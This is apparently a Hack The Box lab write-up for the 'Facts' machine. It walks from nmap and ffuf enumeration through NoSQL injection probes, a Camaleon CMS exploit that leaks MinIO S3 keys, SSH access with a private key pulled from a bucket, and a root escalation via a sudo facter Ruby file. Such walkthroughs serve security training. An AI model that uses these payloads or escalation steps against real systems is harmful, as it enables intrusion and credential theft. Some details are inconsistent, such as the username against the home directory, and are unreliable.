---
title: 'Facts - Hack The Box Writeup (Linux, Easy)'
description: 'Facts HTB Machine Writeup - exploitation walkthrough and key steps'
date: 2026-04-27T00:00:00+01:00
tags: ['HTB', 'Linux', 'Writeup', 'Easy']
authors: ['mensi']
image: ../assets/htb/devarea/1.png
draft: false
maths: true
---

# Facts — Hack The Box Writeup (Linux, Easy)

> “A machine that teaches you everything about facts… except the fact that most of the answers were basically handed to you.”

---

## 1. Initial Recon

We start with the usual ritual sacrifice to Nmap:

```bash
nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.41.13
```

### Output

```bash

┌──(mensi㉿kali)-[~/Desktop]
└─$ nmap -p- -sS -sV --min-rate 10000 --open -n -Pn 10.129.41.13
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 14:48 -0400
Nmap scan report for 10.129.41.13
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=4/27%Time=69EFAF8B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x2018AA4B3BFDC769C1\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2027\x20Ap
SF:r\x202026\x2018:48:43\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>18AA4B3BFDC769C1</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2027\x20
SF:Apr\x202026\x2018:48:44\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018AA4B40828B770D\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Mon,\x2027\x20Apr\x202026\x2018:49:03\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>18AA
SF:4B40828B770D</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds

┌──(mensi㉿kali)-[~/Desktop]
└─$


```

### Open ports discovered:

- 22/tcp → SSH (OpenSSH 9.9)
- 80/tcp → HTTP (nginx 1.26.3)
- 54321/tcp → Unknown (MinIO)

At this point, we already know:

> “If you see MinIO in HTB, you are either about to win or suffer deeply.”

---

## 2. Web Enumeration

We add the target:

```bash
echo "10.129.41.13 facts.htb" | sudo tee -a /etc/hosts
```

Visiting:

```
http://facts.htb
```

![Alt text](../assets/htb/facts/2.png)

We are greeted with:

- A facts website
- Corporate motivational quotes
- And the feeling that nothing is vulnerable

Classic deception arc.

![Alt text](../assets/htb/facts/3.jpg)

---

## 3. Dead End: Search Parameter Abuse Attempts

This is where the suffering begins.

<img src="/assets/htb/facts/4.jpg" alt="suffer" width="600px">

I immediately assume:

> “search = injectable = life is easy”

### First test

```
http://facts.htb/search?q=Animal
```

Works normally. No surprises.

![Alt text](../assets/htb/facts/5.png)

![Alt text](../assets/htb/facts/6.png)

![Alt text](../assets/htb/facts/7.png)

### Attempt 1: Basic injection probing

```bash
http://facts.htb/search?q[$ne]=null
```

Result:

- Server behaves inconsistently
- No clear output
- No bypass

![Alt text](../assets/htb/facts/8.png)

### Attempt 2: Regex injection

```bash
http://facts.htb/search?q[$regex]=.*
```

Result:

- Internal server error
- Application breaks silently

So we think:

> “Nice, we broke it, we are smart.”

But nothing useful comes out.

### Attempt 3: JSON escaping chaos

```bash
http://facts.htb/search?q={\"$ne\":null}"
```

Result:

- Still no bypass
- Still no data leak
- Just server confusion and sadness

### Final realization

The search endpoint is:

- injectable in behavior
- but not exploitable for data extraction at this stage

So we move on.

> “We tried NoSQL injection. The server tried emotional damage.”

---

## 4. Directory Enumeration (ffuf)

After checking the website manually and playing with the `/search` endpoint, I decided to do what every HTB player does when the web app looks too clean:

Spam it with wordlists until it confesses.

I ran `ffuf` to enumerate hidden directories:

```bash
ffuf -u http://facts.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

![Alt text](../assets/htb/facts/10.png)

After a bit of brute-forcing, an interesting endpoint showed up:

```text
/admin                  [Status: 302]
```

A redirect is always suspicious, because it usually means:

- login panel
- admin dashboard
- or a developer who trusted users way too much

Opening it in the browser revealed the admin login page, confirming that we had discovered a privileged section of the application.

This led directly to the next stage of enumeration.

---

## 5. Admin Login & CMS Identification

After discovering `/admin`, I followed the redirect and landed directly on the **admin login page**.

![Alt text](../assets/htb/facts/9.png)

At first glance it looked like a normal authentication portal, offering both **Login** and **Register** options. Since credentials were not provided, I went for the classic HTB approach:

If you can’t log in, just become a user.

So I registered a new account and successfully logged in.

While exploring the admin panel, I noticed something very useful in the page content and structure: the application was running **Camaleon CMS**. This was confirmed through visible references in the interface and CMS-specific routes, which instantly turned the situation from “random web app” into:

> “Okay, now we’re dealing with something that probably has a CVE with my name on it.”

This discovery was a key turning point, because identifying the CMS allowed me to search for known vulnerabilities and exploitation paths.

---

## The Plot Twist: MinIO Appears

Port 54321 reveals MinIO S3-compatible storage.

So now the machine evolves into:

Web App → NoSQLi → Cloud Storage → Pain

---

## CMS Exploit → Credential Leak

We run:

```bash
python3 CVE-2025-2304.py -u http://facts.htb -U mensi -P mensi -e -r
```

We get:

```
s3 access key: AKIAD9A2F65061D176AF
s3 secret key: a46pdJHQvIaJtTiT99lHFX3i9m2wOPXrSoO6KLJC
s3 endpoint: http://localhost:54321
```

At this point:
The machine basically hands us the keys and says “please leave me alone”.

---

## MinIO Exploitation

We configure AWS CLI:

```bash
aws configure
```

Then:

```bash
aws --endpoint-url http://10.129.41.13:54321 s3 ls
```

Buckets discovered:

- internal
- randomfacts

---

## The “internal” Bucket

Inside we find:

```
.ssh/authorized_keys
```

We download it:

```bash
aws s3 cp s3://internal/.ssh/authorized_keys .
```

Content:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFfgjpLS4XE0OvROzUd8rw/pm0V+UJk1X3kDoy/9eNpt
```

---

Then we discover the real prize:

```
id_ed25519 (PRIVATE KEY)
```

Full key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0...
-----END OPENSSH PRIVATE KEY-----
```

This is the actual foothold.

---

## SSH Access

We fix permissions:

```bash
chmod 600 id_ed25519
```

Then:

```bash
ssh -i id_ed25519 trivia@10.129.41.13
```

We are in.

---

## User Flag

Inside:

```bash
cat /home/william/user.txt
```

Flag:

```
baf417b86bbb699f9df682ca1caedb72
```

User flag obtained.

At this point:
We are no longer “hackers”, we are “warehouse employees sorting AWS buckets”.

---

## Privilege Escalation

We discover:

```bash
sudo /usr/bin/facter
```

We test:

```bash
echo 'exec "/bin/bash"' > exploit.rb
```

Then:

```bash
sudo /usr/bin/facter -- custom-dir /home/trivia/ exploit
```

And suddenly:

```
root@facts
```

---

## Root Cause

- facter loads Ruby files from custom directory
- sudo executes facter as root
- Ruby code gets executed as root

Result:

Arbitrary code execution as root

---

## Root Flag

```
cat /root/root.txt
```

Root obtained.

Machine defeated.

---

## Final Thoughts

This machine teaches:

Web Layer

- NoSQL injection exists but may not always be the win condition

Cloud Layer

- Exposed MinIO = instant disaster

Privilege Escalation

- Unsafe plugin execution in system tools = root in 2 lines

---

## Summary

This machine can be described as:

A vulnerable web app that accidentally exposed its database, cloud storage, and root shell in that order.

---

## Difficulty rating

- Recon: ⭐⭐
- Web: ⭐⭐⭐⭐
- Cloud pivot: ⭐⭐⭐⭐⭐
- Privesc: ⭐⭐⭐ (but only if you read Ruby docs while crying)

---

## End result

- NoSQLi attempted (dead end)
- MinIO compromised
- SSH foothold gained
- Ruby privesc abused
- Root obtained
- Sanity lost
